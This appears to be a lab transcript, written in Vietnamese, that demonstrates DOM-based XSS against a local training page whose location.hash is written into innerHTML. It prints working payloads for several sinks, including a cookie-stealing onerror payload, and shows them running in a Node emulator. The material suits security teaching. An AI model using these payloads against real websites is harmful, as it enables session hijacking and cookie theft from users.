@@ -1,0 +1,78 @@
+# Transcript lab 3.3 - DOM-based XSS
+# Trang tinh co lo hong: 127.0.0.1:8034 | Ngay: 2026-10-18T10:22:49Z
+
+## Trang server tra ve (curl) - luu y: KHONG he co payload, server bat bien
+$ curl -s http://127.0.0.1:8034/
+<!doctype html>
+<html lang="vi"><head><meta charset="utf-8"><title>Loi chao DOM</title></head>
+<body>
+<h1>Trang loi chao</h1>
+<div id="out">...</div>
+<script>
+  // source: location.hash (vi du #Hai). slice(1) bo dau '#'.
+  var name = decodeURIComponent(location.hash.slice(1));
+  // sink: innerHTML. Gan chuoi co the chua the HTML => DOM XSS.
+  document.getElementById('out').innerHTML = "Xin chao " + name;
+</script>
+</body></html>
+
+## (a)(b) Phan tich luong source->sink + chung minh fragment khong gui len server
+$ python3 exploit.py
+======================================================================
+[a] PHAN TICH LUONG trong JS client
+    source phat hien : ['location.hash']
+    sink  phat hien  : ['innerHTML']
+    ham lam sach     : KHONG CO
+    => CO DOM XSS: source di thang toi sink, khong lam sach
+======================================================================
+[b] Chung minh server KHONG nhin thay payload (fragment khong duoc gui len)
+    URL yeu cau     : http://127.0.0.1:8034/#<img src=x onerror=alert(1)>
+    path thuc su gui: /  (khong he co phan sau #)
+    body server tra ve giong het trang goc? : CO
+======================================================================
+[c] Payload theo tung sink
+    innerHTML      : #<img src=x onerror=alert(document.domain)>
+    innerHTML(exfil): #<img src=x onerror="exfil(document.cookie)">
+    document.write : #<script>alert(1)</script>  (write chay ca script tag)
+    eval/sink JS   : #;alert(1);//
+======================================================================
+Phan THUC THI chay bang Node: node dom-emulate.js
+TONG KET phan tich: DOM XSS kha thi qua innerHTML
+
+## (c) THUC THI that bang trinh duyet mini (Node): payload alert(document.domain)
+$ node dom-emulate.js "<img src=x onerror=alert(document.domain)>"
+======================================================================
+[1] Trang server tra ve (bat bien, KHONG chua payload):
+    payload nam o location.hash, server khong he nhin thay no.
+    URL nan nhan bi lua mo: http://127.0.0.1:8034/#<img src=x onerror=alert(document.domain)>
+======================================================================
+[2] Doan JS client (source -> sink) ma server ship:
+    // source: location.hash (vi du #Hai). slice(1) bo dau '#'.
+    var name = decodeURIComponent(location.hash.slice(1));
+    // sink: innerHTML. Gan chuoi co the chua the HTML => DOM XSS.
+    document.getElementById('out').innerHTML = "Xin chao " + name;
+======================================================================
+[3] Chay doan script client voi location.hash = payload:
+    >>> alert() CHAY voi gia tri: 127.0.0.1
+======================================================================
+[4] KET QUA: DOM XSS THANH CONG. Code ke tan cong da chay:
+      - alert(127.0.0.1)
+
+## THUC THI payload exfil cookie: onerror=exfil(document.cookie)
+$ node dom-emulate.js "<img src=x onerror=\"exfil(document.cookie)\">"
+======================================================================
+[1] Trang server tra ve (bat bien, KHONG chua payload):
+    payload nam o location.hash, server khong he nhin thay no.
+    URL nan nhan bi lua mo: http://127.0.0.1:8034/#<img src=x onerror="exfil(document.cookie)">
+======================================================================
+[2] Doan JS client (source -> sink) ma server ship:
+    // source: location.hash (vi du #Hai). slice(1) bo dau '#'.
+    var name = decodeURIComponent(location.hash.slice(1));
+    // sink: innerHTML. Gan chuoi co the chua the HTML => DOM XSS.
+    document.getElementById('out').innerHTML = "Xin chao " + name;
+======================================================================
+[3] Chay doan script client voi location.hash = payload:
+    >>> exfil() CHAY, gui di: session=dom-victim-9b1c
+======================================================================
+[4] KET QUA: DOM XSS THANH CONG. Code ke tan cong da chay:
+      - exfil(session=dom-victim-9b1c)
